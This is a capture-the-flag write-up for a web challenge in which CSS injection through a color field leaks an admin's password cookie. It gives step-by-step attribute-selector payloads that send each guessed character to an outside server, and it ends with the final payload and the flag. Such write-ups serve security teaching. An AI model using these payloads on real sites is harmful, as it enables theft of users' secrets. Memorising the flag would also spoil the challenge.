# The Confused Deputy

Author: [roerohan](https://github.com/roerohan)

## Description

This website can be exploited with the help of CSS Injection.

## Requirements

- Docker: [Dockerfile](./Dockerfile)
- Node.js

## Sources

```
Wow that's a pretty color! Don't you think? Pick your favourite and show it to the admin on /admin.
```

## Exploit

This is a CSS injection challenge (of course you can do `<<script >>` but the intended solution is CSS injection). In the page you open, you can see that there is an input box where you can enter a color, which gets applied as you click on submit. There's also a hidden field `password`, the value of which is taken from the cookie. Since the string is interpolated, you can do something like `blue}; input[type="password"][value^="c"] {background-image: url('https://example.com?c');`, which will send a request to `example.com?c`, if the first character of the password is `c`.
<br />

You may pass a long list of such CSS selectors, for all letters, for example. For example:

```css
input[type="password"][value^="a"] {background-image: url('https://example.com?a');}
input[type="password"][value^="b"] {background-image: url('https://example.com?b');}
input[type="password"][value^="c"] {background-image: url('https://example.com?c');}
...
```

This will therefore tell you which character matched, which you can see on your own server (here example.com). Once the first character is leaked, you can go ahead and try to leak the next character.

```css
input[type="password"][value^="ca"] {background-image: url('https://example.com?ca');}
input[type="password"][value^="cb"] {background-image: url('https://example.com?cb');}
input[type="password"][value^="cc"] {background-image: url('https://example.com?cc');}
...
```

An so on, until you find the entire password. You can test this on your browser by storing a cookie called `password` with the value `csictf`. Now pass the following to get a request on your server (replace example.com with your server).

```css
blue;} input[type="password"][value^="csictf"] {background-image: url('https://example.com?csictf');
```

Pass these payloads to `/admin` and you can leak the admin cookie `password`, which is the flag. The final payload with the help of which you can find the entire flag is:

```css
blue;} input[type="password"][value^="csictf{cssxss}"] {background-image: url('https://example.com?csictf{cssxss}');
```

<br />

The flag is:

```
csictf{cssxss}
```